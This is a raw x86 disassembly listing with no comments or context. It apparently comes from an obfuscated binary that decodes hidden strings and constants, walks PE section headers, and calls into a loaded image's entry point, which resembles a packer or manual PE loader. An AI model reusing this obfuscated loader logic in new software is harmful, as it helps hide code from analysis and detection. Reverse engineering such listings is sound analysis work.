  426769:	mov    DWORD PTR [ebp-0x90],0xf89c852d
  426773:	mov    DWORD PTR [ebp-0x8c],ecx
  426779:	mov    DWORD PTR [ebp-0x88],0xf89c852a
  426783:	mov    DWORD PTR [ebp-0x84],edx
  426789:	mov    DWORD PTR [ebp-0x80],0xf89c85d0
  426790:	mov    DWORD PTR [ebp-0x7c],ecx
  426793:	mov    DWORD PTR [ebp-0x78],0xf89c85e2
  42679a:	mov    DWORD PTR [ebp-0x6c],ecx
  42679d:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  4267a4:	mov    DWORD PTR [ebp-0x5c],0xf89c85a1
  4267ab:	xor    eax,eax
  4267ad:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4267b4:	xor    cl,0xac
  4267b7:	sub    cl,0xd
  4267ba:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4267c1:	inc    eax
  4267c2:	cmp    eax,0x17
  4267c5:	jb     0x4267ad
  4267c7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4267cd:	lea    ecx,[ebp-0xc0]
  4267d3:	push   ecx
  4267d4:	call   DWORD PTR [eax+0x4]
  4267d7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4267dd:	lea    edx,[ebp-0xd8]
  4267e3:	push   edx
  4267e4:	push   eax
  4267e5:	call   DWORD PTR [ecx+0x8]
  4267e8:	mov    DWORD PTR [ebp-0x40],eax
  4267eb:	lea    eax,[ebp-0x14]
  4267ee:	push   eax
  4267ef:	mov    eax,DWORD PTR [ebx+0x18c]
  4267f5:	push   DWORD PTR [eax]
  4267f7:	mov    eax,DWORD PTR [ebp-0x40]
  4267fa:	call   eax
  4267fc:	mov    eax,DWORD PTR [ebp-0x4]
  4267ff:	xor    eax,esi
  426801:	add    eax,edi
  426803:	mov    DWORD PTR [ebp-0x34],eax
  426806:	mov    ecx,DWORD PTR [ebp-0x4]
  426809:	mov    eax,DWORD PTR [ebp-0x14]
  42680c:	xor    ecx,esi
  42680e:	add    ecx,edi
  426810:	cmp    eax,ecx
  426812:	je     0x42685d
  426814:	mov    DWORD PTR [ebp-0x3c],eax
  426817:	jmp    0x426828
  426819:	mov    eax,DWORD PTR [eax]
  42681b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42681e:	mov    DWORD PTR [ebp-0x14],eax
  426821:	mov    eax,DWORD PTR [ebp-0x14]
  426824:	cmp    eax,ecx
  426826:	je     0x426835
  426828:	mov    edx,DWORD PTR [eax+0x18]
  42682b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426831:	cmp    edx,DWORD PTR [ecx]
  426833:	jne    0x426819
  426835:	mov    ecx,DWORD PTR [ebx+0x18c]
  42683b:	mov    edx,DWORD PTR [eax+0x18]
  42683e:	cmp    edx,DWORD PTR [ecx]
  426840:	jne    0x42685d
  426842:	mov    ecx,DWORD PTR [ebx+0x190]
  426848:	mov    edx,DWORD PTR [ebp-0x20]
  42684b:	mov    edx,DWORD PTR [edx+0x28]
  42684e:	add    edx,DWORD PTR [ecx]
  426850:	mov    DWORD PTR [eax+0x1c],edx
  426853:	mov    eax,DWORD PTR [ebp-0x24]
  426856:	xor    eax,esi
  426858:	add    eax,edi
  42685a:	mov    DWORD PTR [ebp-0x34],eax
  42685d:	mov    eax,DWORD PTR [ebp+0xc]
  426860:	push   ebx
  426861:	push   eax
  426862:	push   DWORD PTR [ebp+0x20]
  426865:	call   0x425fe3
  42686a:	test   eax,eax
  42686c:	je     0x426935
  426872:	push   DWORD PTR [ebp+0xc]
  426875:	mov    ecx,ebx
  426877:	push   DWORD PTR [ebp+0x20]
  42687a:	call   0x425f3c
  42687f:	test   eax,eax
  426881:	je     0x426935
  426887:	mov    eax,DWORD PTR [ebp+0xc]
  42688a:	mov    edx,DWORD PTR [ebp+0x20]
  42688d:	mov    ecx,ebx
  42688f:	call   0x425e15
  426894:	test   eax,eax
  426896:	je     0x426935
  42689c:	push   ebx
  42689d:	push   DWORD PTR [ebp+0x20]
  4268a0:	call   0x4262c6
  4268a5:	test   eax,eax
  4268a7:	je     0x426935
  4268ad:	mov    eax,DWORD PTR [ebx+0x18c]
  4268b3:	mov    edx,DWORD PTR [ebp+0x20]
  4268b6:	cmp    edx,DWORD PTR [eax]
  4268b8:	jne    0x4268d4
  4268ba:	mov    eax,DWORD PTR [ebx+0x1e0]
  4268c0:	lea    ecx,[ebp-0x18]
  4268c3:	push   ecx
  4268c4:	push   DWORD PTR [ebp-0x18]
  4268c7:	mov    ecx,DWORD PTR [ebp-0x20]
  4268ca:	push   DWORD PTR [ecx+0x54]
  4268cd:	push   edx
  4268ce:	call   DWORD PTR [eax+0x1c]
  4268d1:	mov    edx,DWORD PTR [ebp+0x20]
  4268d4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4268da:	mov    eax,DWORD PTR [eax]
  4268dc:	xor    eax,esi
  4268de:	add    eax,edi
  4268e0:	je     0x426919
  4268e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4268e5:	mov    eax,DWORD PTR [ecx+0x28]
  4268e8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a1
  4268ef:	mov    esi,DWORD PTR [ebp+0x8]
  4268f2:	push   DWORD PTR [ebp+0x14]
  4268f5:	xor    esi,0x8ac
  4268fb:	push   DWORD PTR [ebp+0x10]
  4268fe:	add    esi,0x72f3
  426904:	or     WORD PTR [ecx+0x16],si
  426908:	add    eax,edx
  42690a:	push   edx
  42690b:	call   eax
  42690d:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a2
  426917:	jmp    0x426923
  426919:	mov    eax,DWORD PTR [ebp+0xc]
  42691c:	mov    eax,DWORD PTR [eax+0x28]
  42691f:	add    eax,edx
  426921:	call   eax
  426923:	mov    DWORD PTR [ebp-0x8],eax
  426926:	mov    eax,DWORD PTR [ebp-0x8]
  426929:	mov    ecx,DWORD PTR [ebp+0x1c]
  42692c:	mov    DWORD PTR [ecx],eax
  42692e:	mov    DWORD PTR [ebp-0x30],0x1
  426935:	cmp    DWORD PTR [ebp-0x30],0x0
  426939:	jne    0x42693f
  42693b:	and    DWORD PTR [ebp+0x20],0x0
  42693f:	mov    eax,DWORD PTR [ebp+0x20]
  426942:	jmp    0x426946
  426944:	xor    eax,eax
  426946:	pop    edi
  426947:	pop    esi
  426948:	pop    ebx
  426949:	leave  
  42694a:	ret    0x1c
  42694d:	push   ebp
  42694e:	mov    ebp,esp
  426950:	movzx  edx,WORD PTR [ecx+0x6]
  426954:	movzx  eax,WORD PTR [ecx+0x14]
  426958:	push   ebx
  426959:	push   edi
  42695a:	xor    edi,edi
  42695c:	lea    eax,[eax+ecx*1+0x18]
  426960:	test   edx,edx
  426962:	je     0x426983
  426964:	mov    ecx,DWORD PTR [eax+0xc]
  426967:	lea    ebx,[ecx+esi*1]
  42696a:	cmp    DWORD PTR [ebp+0x8],ebx
  42696d:	jb     0x42697b
  42696f:	mov    ebx,DWORD PTR [eax+0x8]
  426972:	add    ebx,ecx
  426974:	add    ebx,esi
  426976:	cmp    DWORD PTR [ebp+0x8],ebx
  426979:	jb     0x426985
  42697b:	add    eax,0x28
  42697e:	inc    edi
  42697f:	cmp    edi,edx
  426981:	jb     0x426964
  426983:	xor    eax,eax
  426985:	pop    edi
  426986:	pop    ebx
  426987:	pop    ebp
  426988:	ret    0x4
  42698b:	push   ebp
  42698c:	mov    ebp,esp
  42698e:	sub    esp,0x34
  426991:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  426998:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  42699f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  4269a6:	mov    DWORD PTR [ebp-0x8],0xf89c85c2
  4269ad:	mov    DWORD PTR [ebp-0x20],0xf89c85e2
  4269b4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4269bb:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4269c2:	mov    DWORD PTR [ebp-0x10],eax
  4269c5:	mov    eax,DWORD PTR [ebp+0x8]
  4269c8:	mov    DWORD PTR [ebp-0x14],eax
  4269cb:	mov    eax,DWORD PTR [ebp-0xc]
  4269ce:	push   ebx
  4269cf:	mov    ecx,0x75108ac
  4269d4:	xor    eax,ecx
  4269d6:	push   esi
  4269d7:	mov    esi,DWORD PTR [ebp-0x10]
  4269da:	mov    edx,0x3272f3
  4269df:	add    eax,edx
  4269e1:	push   edi
  4269e2:	cmp    esi,eax
  4269e4:	je     0x426bc3
  4269ea:	mov    eax,DWORD PTR [ebp-0xc]
  4269ed:	mov    esi,DWORD PTR [ebp-0x14]
  4269f0:	xor    eax,ecx
  4269f2:	add    eax,edx
  4269f4:	cmp    esi,eax
  4269f6:	je     0x426bc3
  4269fc:	mov    eax,DWORD PTR [ebp-0xc]
  4269ff:	xor    eax,ecx
  426a01:	add    eax,edx
  426a03:	mov    DWORD PTR [ebp-0x24],eax
  426a06:	mov    eax,DWORD PTR [ebp-0xc]
  426a09:	xor    eax,ecx
  426a0b:	add    eax,edx
  426a0d:	mov    DWORD PTR [ebp-0x28],eax
  426a10:	mov    edi,DWORD PTR [ebp-0x20]
  426a13:	mov    ebx,DWORD PTR [ebp-0x8]
  426a16:	mov    esi,0x8ac
  426a1b:	xor    edi,esi
  426a1d:	mov    eax,0x72f3
  426a22:	xor    ebx,esi
  426a24:	add    edi,eax
  426a26:	add    ebx,eax
  426a28:	sub    ebx,edi
  426a2a:	mov    WORD PTR [ebp-0x8],bx
  426a2e:	jmp    0x426af3
  426a33:	mov    edi,DWORD PTR [ebp-0xc]
  426a36:	mov    bx,WORD PTR [ebp-0x4]
  426a3a:	xor    edi,esi
  426a3c:	add    edi,eax
  426a3e:	cmp    bx,di
  426a41:	je     0x426b35
  426a47:	mov    edi,DWORD PTR [ebp-0xc]
  426a4a:	mov    ebx,DWORD PTR [ebp+0xc]
  426a4d:	xor    edi,ecx
  426a4f:	add    edi,edx
  426a51:	cmp    ebx,edi
  426a53:	mov    di,WORD PTR [ebp-0x4]
  426a57:	mov    bx,WORD PTR [ebp+0x8]
  426a5b:	je     0x426ac6
  426a5d:	cmp    bx,di
  426a60:	je     0x426acf
  426a62:	mov    edi,DWORD PTR [ebp-0x20]
  426a65:	mov    bx,WORD PTR [ebp+0x8]
  426a69:	xor    edi,esi
  426a6b:	add    edi,eax
  426a6d:	cmp    bx,di
  426a70:	jb     0x426a90
  426a72:	mov    edi,DWORD PTR [ebp-0x2c]
  426a75:	mov    bx,WORD PTR [ebp+0x8]
  426a79:	xor    edi,esi
  426a7b:	add    edi,eax
  426a7d:	cmp    bx,di
  426a80:	ja     0x426a90
  426a82:	movzx  edi,WORD PTR [ebp+0x8]
  426a86:	movzx  ebx,WORD PTR [ebp-0x8]
  426a8a:	add    edi,ebx
  426a8c:	mov    WORD PTR [ebp+0x8],di
  426a90:	mov    edi,DWORD PTR [ebp-0x20]
  426a93:	mov    bx,WORD PTR [ebp-0x4]
  426a97:	xor    edi,esi
  426a99:	add    edi,eax
  426a9b:	cmp    bx,di
  426a9e:	jb     0x426abe
  426aa0:	mov    edi,DWORD PTR [ebp-0x2c]
  426aa3:	mov    bx,WORD PTR [ebp-0x4]
  426aa7:	xor    edi,esi
  426aa9:	add    edi,eax
  426aab:	cmp    bx,di
  426aae:	ja     0x426abe
  426ab0:	movzx  edi,WORD PTR [ebp-0x4]
  426ab4:	movzx  ebx,WORD PTR [ebp-0x8]
  426ab8:	add    edi,ebx
  426aba:	mov    WORD PTR [ebp-0x4],di
  426abe:	mov    di,WORD PTR [ebp-0x4]
  426ac2:	mov    bx,WORD PTR [ebp+0x8]
  426ac6:	cmp    bx,di
  426ac9:	jne    0x426bc3
  426acf:	mov    edi,DWORD PTR [ebp-0x1c]
  426ad2:	mov    ebx,DWORD PTR [ebp-0x10]
  426ad5:	xor    edi,ecx
  426ad7:	lea    edi,[edi+ebx*1+0x3272f3]
  426ade:	mov    DWORD PTR [ebp-0x10],edi
  426ae1:	mov    edi,DWORD PTR [ebp-0x1c]
  426ae4:	mov    ebx,DWORD PTR [ebp-0x14]
  426ae7:	xor    edi,ecx
  426ae9:	lea    edi,[edi+ebx*1+0x3272f3]
  426af0:	mov    DWORD PTR [ebp-0x14],edi
  426af3:	mov    edi,DWORD PTR [ebp-0x24]
  426af6:	mov    ebx,DWORD PTR [ebp-0x10]
  426af9:	mov    di,WORD PTR [ebx+edi*2]
  426afd:	mov    WORD PTR [ebp+0x8],di
  426b01:	mov    edi,DWORD PTR [ebp-0x28]
  426b04:	mov    ebx,DWORD PTR [ebp-0x14]
  426b07:	mov    di,WORD PTR [ebx+edi*2]
  426b0b:	mov    WORD PTR [ebp-0x4],di
  426b0f:	mov    edi,DWORD PTR [ebp-0xc]
  426b12:	mov    bx,WORD PTR [ebp+0x8]
  426b16:	xor    edi,esi
  426b18:	add    edi,eax
  426b1a:	cmp    bx,di
  426b1d:	jne    0x426a33
  426b23:	mov    eax,DWORD PTR [ebp-0x18]
  426b26:	mov    esi,DWORD PTR [ebp-0xc]
  426b29:	xor    eax,ecx
  426b2b:	add    eax,edx
  426b2d:	imul   eax,esi
  426b30:	mov    DWORD PTR [ebp-0xc],eax
  426b33:	jmp    0x426b47
  426b35:	mov    eax,DWORD PTR [ebp-0xc]
  426b38:	mov    esi,DWORD PTR [ebp-0x18]
  426b3b:	xor    eax,ecx
  426b3d:	lea    eax,[eax+esi*1+0x3272f3]
  426b44:	mov    DWORD PTR [ebp-0x18],eax
  426b47:	mov    eax,DWORD PTR [ebp-0x24]
  426b4a:	sub    eax,edx
  426b4c:	xor    eax,ecx
  426b4e:	mov    DWORD PTR [ebp-0x30],eax
  426b51:	mov    eax,DWORD PTR [ebp-0x28]
  426b54:	sub    eax,edx
  426b56:	xor    eax,ecx
  426b58:	mov    DWORD PTR [ebp-0x34],eax
  426b5b:	mov    eax,DWORD PTR [ebp-0x34]
  426b5e:	mov    esi,DWORD PTR [ebp-0x1c]
  426b61:	xor    esi,ecx
  426b63:	add    esi,edx
  426b65:	xor    eax,ecx
  426b67:	add    eax,0x3272f3
  426b6c:	imul   esi,eax
  426b6f:	mov    eax,DWORD PTR [ebp-0x14]
  426b72:	movzx  eax,WORD PTR [esi+eax*1]
  426b76:	mov    esi,DWORD PTR [ebp-0x30]
  426b79:	mov    edi,DWORD PTR [ebp-0x1c]
  426b7c:	xor    esi,ecx
  426b7e:	add    esi,edx
  426b80:	xor    edi,ecx
  426b82:	add    edi,edx
  426b84:	imul   edi,esi
  426b87:	mov    esi,DWORD PTR [ebp-0x10]
  426b8a:	movzx  esi,WORD PTR [edi+esi*1]
  426b8e:	sub    eax,edx
  426b90:	sub    esi,edx
  426b92:	xor    eax,ecx
  426b94:	xor    esi,ecx
  426b96:	cmp    esi,eax
  426b98:	jne    0x426bc3
  426b9a:	mov    eax,DWORD PTR [ebp-0x30]
  426b9d:	mov    esi,DWORD PTR [ebp-0x1c]
  426ba0:	xor    eax,ecx
  426ba2:	add    eax,0x3272f3
  426ba7:	xor    esi,ecx
  426ba9:	add    esi,edx
  426bab:	imul   esi,eax
  426bae:	mov    eax,DWORD PTR [ebp-0x10]
  426bb1:	movzx  eax,WORD PTR [esi+eax*1]
  426bb5:	mov    esi,DWORD PTR [ebp-0xc]
  426bb8:	sub    eax,edx
  426bba:	xor    eax,ecx
  426bbc:	cmp    eax,esi
  426bbe:	mov    eax,DWORD PTR [ebp-0xc]
  426bc1:	je     0x426bc6
  426bc3:	mov    eax,DWORD PTR [ebp-0x18]
  426bc6:	pop    edi
  426bc7:	xor    eax,ecx
  426bc9:	pop    esi
  426bca:	add    eax,edx
  426bcc:	pop    ebx
  426bcd:	leave  
  426bce:	ret    0x8
  426bd1:	push   ebp
  426bd2:	mov    ebp,esp
  426bd4:	push   ecx
  426bd5:	mov    cx,WORD PTR [eax]
  426bd8:	push   esi
  426bd9:	mov    esi,0x3b5b
  426bde:	sub    cx,si
  426be1:	mov    esi,0x8a99
  426be6:	xor    cx,si
  426be9:	mov    esi,0x4e3c
  426bee:	mov    DWORD PTR [ebp-0x4],0xf89c85a0
  426bf5:	mov    edx,0xf89c85a1
  426bfa:	cmp    cx,si
  426bfd:	je     0x426c5c
  426bff:	push   ebx
  426c00:	push   edi
  426c01:	movzx  ecx,cx
  426c04:	mov    edi,0xffcd8d0d
  426c09:	mov    esi,0x75108ac
  426c0e:	mov    ebx,0x4f98
  426c13:	cmp    cx,bx
  426c16:	jne    0x426c1b
  426c18:	mov    DWORD PTR [ebp-0x4],edx
  426c1b:	lea    edx,[edi+0x1]
  426c1e:	xor    edx,esi
  426c20:	mov    edi,edx
  426c22:	xor    edi,esi
  426c24:	mov    cx,WORD PTR [eax+edi*2+0x64e5e6]
  426c2c:	mov    ebx,0x3b5b
  426c31:	sub    cx,bx
  426c34:	mov    ebx,0x8a99
  426c39:	xor    cx,bx
  426c3c:	mov    ebx,0x4e3c
  426c41:	cmp    cx,bx
  426c44:	jne    0x426c0e
  426c46:	mov    ecx,DWORD PTR [ebp-0x4]
  426c49:	pop    edi
  426c4a:	pop    ebx
  426c4b:	cmp    ecx,0xf89c85a0
  426c51:	je     0x426c5c
  426c53:	xor    ecx,esi
  426c55:	lea    eax,[eax+ecx*2+0x64e5e8]
  426c5c:	pop    esi
  426c5d:	leave  
  426c5e:	ret    
  426c5f:	push   ebp
  426c60:	mov    ebp,esp
  426c62:	push   ecx
  426c63:	push   esi
  426c64:	push   edi
  426c65:	mov    DWORD PTR [ebp-0x4],0xf89c85a0
  426c6c:	mov    esi,0xf89c85a1
  426c71:	call   0x426bd1
  426c76:	mov    edi,eax
  426c78:	mov    al,BYTE PTR [edi]
  426c7a:	sub    al,0x2
  426c7c:	xor    al,0x7d
  426c7e:	cmp    al,0x83
  426c80:	je     0x426ce3
  426c82:	mov    eax,edi
  426c84:	mov    edx,0xffcd8d0d
  426c89:	mov    ecx,0x75108ac
  426c8e:	push   ebx
  426c8f:	mov    ax,WORD PTR [eax]
  426c92:	mov    ebx,0x3b5b
  426c97:	sub    ax,bx
  426c9a:	mov    ebx,0x8a99
  426c9f:	xor    ax,bx
  426ca2:	mov    ebx,0x4e4a
  426ca7:	cmp    ax,bx
  426caa:	jne    0x426caf
  426cac:	mov    DWORD PTR [ebp-0x4],esi
  426caf:	lea    esi,[edx+0x1]
  426cb2:	xor    esi,ecx
  426cb4:	mov    edx,esi
  426cb6:	xor    edx,ecx
  426cb8:	lea    eax,[edi+edx*2+0x64e5e6]
  426cbf:	mov    bl,BYTE PTR [eax]
  426cc1:	sub    bl,0x2
  426cc4:	xor    bl,0x7d
  426cc7:	cmp    bl,0x83
  426cca:	jne    0x426c8f
  426ccc:	mov    eax,DWORD PTR [ebp-0x4]
  426ccf:	pop    ebx
  426cd0:	cmp    eax,0xf89c85a0
  426cd5:	je     0x426ce3
  426cd7:	xor    eax,ecx
  426cd9:	xor    ecx,ecx
  426cdb:	mov    WORD PTR [edi+eax*2+0x64e5e6],cx
  426ce3:	mov    eax,edi
  426ce5:	pop    edi
  426ce6:	pop    esi
  426ce7:	leave  
  426ce8:	ret    
  426ce9:	push   ebp
  426cea:	mov    ebp,esp
  426cec:	push   ecx
  426ced:	push   esi
  426cee:	mov    DWORD PTR [ebp-0x4],0xf89c85a0
  426cf5:	mov    esi,0xf89c85a1
  426cfa:	call   0x426bd1
  426cff:	mov    cx,WORD PTR [eax]
  426d02:	mov    edx,0x3b5b
  426d07:	sub    cx,dx
  426d0a:	mov    edx,0x8a99
  426d0f:	xor    cx,dx
  426d12:	mov    edx,0x4e3c
  426d17:	cmp    cx,dx
  426d1a:	je     0x426d73
  426d1c:	push   ebx
  426d1d:	push   edi
  426d1e:	movzx  ecx,cx
  426d21:	mov    edx,0xffcd8d0d
  426d26:	mov    edi,0x75108ac
  426d2b:	mov    ebx,0x4e4a
  426d30:	cmp    cx,bx
  426d33:	jne    0x426d38
  426d35:	mov    DWORD PTR [ebp-0x4],esi
  426d38:	lea    esi,[edx+0x1]
  426d3b:	xor    esi,edi
  426d3d:	mov    edx,esi
  426d3f:	xor    edx,edi
  426d41:	mov    cx,WORD PTR [eax+edx*2+0x64e5e6]
  426d49:	mov    ebx,0x3b5b
  426d4e:	sub    cx,bx
  426d51:	mov    ebx,0x8a99
  426d56:	xor    cx,bx
  426d59:	mov    ebx,0x4e3c
  426d5e:	cmp    cx,bx
  426d61:	jne    0x426d2b
  426d63:	cmp    DWORD PTR [ebp-0x4],0xf89c85a0
  426d6a:	pop    edi
  426d6b:	pop    ebx
  426d6c:	je     0x426d73
  426d6e:	xor    eax,eax
  426d70:	inc    eax
  426d71:	jmp    0x426d75
  426d73:	xor    eax,eax
  426d75:	pop    esi
  426d76:	leave  
  426d77:	ret    
  426d78:	push   ebp
  426d79:	mov    ebp,esp
  426d7b:	push   ecx
  426d7c:	mov    eax,DWORD PTR [ebp+0x8]
  426d7f:	movzx  ecx,WORD PTR [eax]
  426d82:	push   esi
  426d83:	lea    eax,[ecx-0x3b5b]
  426d89:	mov    esi,0x8a99
  426d8e:	push   edi
  426d8f:	xor    eax,esi
  426d91:	mov    edi,0x4e3c
  426d96:	mov    DWORD PTR [ebp-0x4],edx
  426d99:	cmp    ax,di
  426d9c:	je     0x426dc9
  426d9e:	mov    eax,DWORD PTR [ebp+0x8]
  426da1:	sub    eax,edx
  426da3:	mov    DWORD PTR [ebp+0x8],eax
  426da6:	jmp    0x426dab
  426da8:	mov    eax,DWORD PTR [ebp+0x8]
  426dab:	mov    WORD PTR [edx],cx
  426dae:	add    edx,0x2
  426db1:	movzx  edi,WORD PTR [eax+edx*1]
  426db5:	mov    ecx,edi
  426db7:	add    edi,0xffffc4a5
  426dbd:	xor    edi,esi
  426dbf:	mov    eax,0x4e3c
  426dc4:	cmp    di,ax
  426dc7:	jne    0x426da8
  426dc9:	xor    eax,eax
  426dcb:	pop    edi
  426dcc:	mov    WORD PTR [edx],ax
  426dcf:	mov    eax,DWORD PTR [ebp-0x4]
  426dd2:	pop    esi
  426dd3:	leave  
  426dd4:	ret    0x4
  426dd7:	push   ebp
  426dd8:	mov    ebp,esp
  426dda:	sub    esp,0x18
  426ddd:	mov    DWORD PTR [ebp-0x8],0xf89c85a1
  426de4:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  426deb:	mov    ecx,DWORD PTR [ebp-0x8]
  426dee:	push   esi
  426def:	mov    eax,0x75108ac
  426df4:	xor    ecx,eax
  426df6:	mov    esi,0x3272f3
  426dfb:	add    ecx,esi
  426dfd:	mov    DWORD PTR [ebp-0x4],ecx
  426e00:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  426e07:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  426e0e:	push   edi
  426e0f:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426e16:	jmp    0x426eb7
  426e1b:	mov    ecx,DWORD PTR [ebp-0x4]
  426e1e:	mov    edx,DWORD PTR [ebp+0x10]
  426e21:	sub    edx,ecx
  426e23:	mov    ecx,DWORD PTR [ebp-0xc]
  426e26:	xor    ecx,eax
  426e28:	add    ecx,esi
  426e2a:	cmp    edx,ecx
  426e2c:	jbe    0x426e49
  426e2e:	mov    edx,DWORD PTR [ebp-0x4]
  426e31:	add    edx,DWORD PTR [ebp+0x8]
  426e34:	mov    ecx,DWORD PTR [ebp-0x4]
  426e37:	add    ecx,DWORD PTR [ebp+0xc]
  426e3a:	mov    edi,DWORD PTR [ecx]
  426e3c:	mov    DWORD PTR [edx],edi
  426e3e:	mov    ecx,DWORD PTR [ecx+0x4]
  426e41:	mov    DWORD PTR [edx+0x4],ecx
  426e44:	mov    ecx,DWORD PTR [ebp-0xc]
  426e47:	jmp    0x426e96
  426e49:	mov    ecx,DWORD PTR [ebp-0x4]
  426e4c:	mov    edx,DWORD PTR [ebp+0x10]
  426e4f:	sub    edx,ecx
  426e51:	mov    ecx,DWORD PTR [ebp-0x10]
  426e54:	xor    ecx,eax
  426e56:	add    ecx,esi
  426e58:	cmp    edx,ecx
  426e5a:	mov    ecx,DWORD PTR [ebp-0x4]
  426e5d:	jbe    0x426e71
  426e5f:	add    ecx,DWORD PTR [ebp+0x8]
  426e62:	mov    edx,DWORD PTR [ebp-0x4]
  426e65:	add    edx,DWORD PTR [ebp+0xc]
  426e68:	mov    edx,DWORD PTR [edx]
  426e6a:	mov    DWORD PTR [ecx],edx
  426e6c:	mov    ecx,DWORD PTR [ebp-0x10]
  426e6f:	jmp    0x426e96
  426e71:	mov    edx,DWORD PTR [ebp+0x10]
  426e74:	sub    edx,ecx
  426e76:	mov    ecx,DWORD PTR [ebp-0x14]
  426e79:	xor    ecx,eax
  426e7b:	add    ecx,esi
  426e7d:	cmp    edx,ecx
  426e7f:	mov    ecx,DWORD PTR [ebp-0x4]
  426e82:	jbe    0x426ea7
  426e84:	add    ecx,DWORD PTR [ebp+0x8]
  426e87:	mov    edx,DWORD PTR [ebp-0x4]
  426e8a:	add    edx,DWORD PTR [ebp+0xc]
  426e8d:	mov    dx,WORD PTR [edx]
  426e90:	mov    WORD PTR [ecx],dx
  426e93:	mov    ecx,DWORD PTR [ebp-0x14]
  426e96:	mov    edx,DWORD PTR [ebp-0x4]
  426e99:	xor    ecx,eax
  426e9b:	lea    ecx,[ecx+edx*1+0x3272f3]
  426ea2:	mov    DWORD PTR [ebp-0x4],ecx
  426ea5:	jmp    0x426eb7
  426ea7:	add    ecx,DWORD PTR [ebp+0x8]
  426eaa:	mov    edx,DWORD PTR [ebp-0x4]
  426ead:	add    edx,DWORD PTR [ebp+0xc]
  426eb0:	mov    dl,BYTE PTR [edx]
  426eb2:	mov    BYTE PTR [ecx],dl
  426eb4:	inc    DWORD PTR [ebp-0x4]
  426eb7:	mov    ecx,DWORD PTR [ebp-0x18]
  426eba:	mov    edx,DWORD PTR [ebp+0x10]
  426ebd:	xor    ecx,eax
  426ebf:	add    ecx,esi
  426ec1:	imul   ecx,edx
  426ec4:	mov    edx,DWORD PTR [ebp-0x8]
  426ec7:	mov    edi,DWORD PTR [ebp-0x4]
  426eca:	xor    edx,eax
  426ecc:	lea    edx,[edx+edi*1+0x3272f3]
  426ed3:	cmp    edx,ecx
  426ed5:	jb     0x426e1b
  426edb:	pop    edi
  426edc:	pop    esi
  426edd:	leave  
  426ede:	ret    0xc
  426ee1:	push   ebp
  426ee2:	mov    ebp,esp
  426ee4:	sub    esp,0xc
  426ee7:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  426eee:	push   esi
  426eef:	mov    esi,eax
  426ef1:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  426ef8:	mov    edx,DWORD PTR [ebp-0x4]
  426efb:	mov    eax,0x75108ac
  426f00:	xor    edx,eax
  426f02:	mov    ecx,0x3272f3
  426f07:	add    edx,ecx
  426f09:	cmp    esi,edx
  426f0b:	je     0x426f4d
  426f0d:	push   ebx
  426f0e:	push   edi
  426f0f:	mov    edx,DWORD PTR [ebp-0x8]
  426f12:	mov    ebx,DWORD PTR [ebp+0x8]
  426f15:	xor    edx,eax
  426f17:	mov    edi,0xffcd8d0d
  426f1c:	sub    edi,edx
  426f1e:	add    esi,edi
  426f20:	lea    edx,[esi-0x3272f3]
  426f26:	xor    edx,eax
  426f28:	mov    DWORD PTR [ebp-0xc],edx
  426f2b:	mov    edx,DWORD PTR [ebp-0x4]
  426f2e:	mov    edi,DWORD PTR [ebp-0xc]
  426f31:	xor    dl,0xac
  426f34:	sub    dl,0xd
  426f37:	xor    edi,eax
  426f39:	mov    BYTE PTR [edi+ebx*1+0x3272f3],dl
  426f40:	mov    edx,DWORD PTR [ebp-0x4]
  426f43:	xor    edx,eax
  426f45:	add    edx,ecx
  426f47:	cmp    esi,edx
  426f49:	jne    0x426f0f
  426f4b:	pop    edi
  426f4c:	pop    ebx
  426f4d:	pop    esi
  426f4e:	leave  
  426f4f:	ret    0x4
  426f52:	push   ebp
  426f53:	mov    ebp,esp
  426f55:	sub    esp,0x21c
  426f5b:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  426f62:	mov    DWORD PTR [ebp-0x14],0xf89c85a2
  426f69:	mov    eax,DWORD PTR [ebp+0x10]
  426f6c:	mov    eax,DWORD PTR [ebp-0x4]
  426f6f:	mov    ecx,DWORD PTR [ebp+0x8]
  426f72:	push   esi
  426f73:	push   edi
  426f74:	mov    edi,0x75108ac
  426f79:	xor    eax,edi
  426f7b:	mov    esi,0x3272f3
  426f80:	add    eax,esi
  426f82:	cmp    eax,ecx
  426f84:	mov    eax,DWORD PTR [ebp-0x4]
  426f87:	jne    0x426f92
  426f89:	xor    eax,edi
  426f8b:	add    eax,esi
  426f8d:	jmp    0x42703e
  426f92:	mov    ecx,DWORD PTR [ebp+0xc]
  426f95:	xor    eax,edi
  426f97:	add    eax,esi
  426f99:	cmp    eax,ecx
  426f9b:	jne    0x426fa2
  426f9d:	mov    eax,DWORD PTR [ebp-0x4]
  426fa0:	jmp    0x426f89
  426fa2:	lea    eax,[ebp-0x21c]
  426fa8:	mov    DWORD PTR [ebp-0x8],eax
  426fab:	mov    eax,DWORD PTR [ebp+0xc]
  426fae:	mov    DWORD PTR [ebp-0x10],eax
  426fb1:	mov    eax,DWORD PTR [ebp-0x4]
  426fb4:	xor    eax,edi
  426fb6:	add    eax,esi
  426fb8:	mov    DWORD PTR [ebp+0x10],eax
  426fbb:	mov    eax,DWORD PTR [ebp+0xc]
  426fbe:	push   ebx
  426fbf:	call   0x426ce9
  426fc4:	mov    ebx,eax
  426fc6:	mov    eax,DWORD PTR [ebp+0x8]
  426fc9:	mov    eax,DWORD PTR [eax+0x14]
  426fcc:	jmp    0x427026
  426fce:	mov    eax,DWORD PTR [ebp+0xc]
  426fd1:	sub    eax,0x8
